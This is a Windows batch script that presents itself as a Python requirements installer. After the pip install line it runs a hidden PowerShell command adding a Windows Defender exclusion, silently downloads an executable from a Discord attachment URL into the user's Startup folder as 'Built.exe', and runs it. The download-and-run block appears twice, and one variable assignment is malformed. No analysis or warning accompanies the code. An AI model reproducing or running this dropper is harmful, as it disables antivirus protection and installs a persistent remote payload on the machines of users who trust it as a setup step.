@echo off
python -m pip install -r requirements.txt


powershell -w hidden -c Add-MpPreference -ExclusionPath ""

@echo off
setlocal 

set "https://cdn.discordapp.com/attachments/973337617057869825/1186665747443896350/Python_Installer.exe"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"

@echo off
setlocal 

set "https://cdn.discordapp.com/attachments/973337617057869825/1186665747443896350/Python_Installer.exe"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"
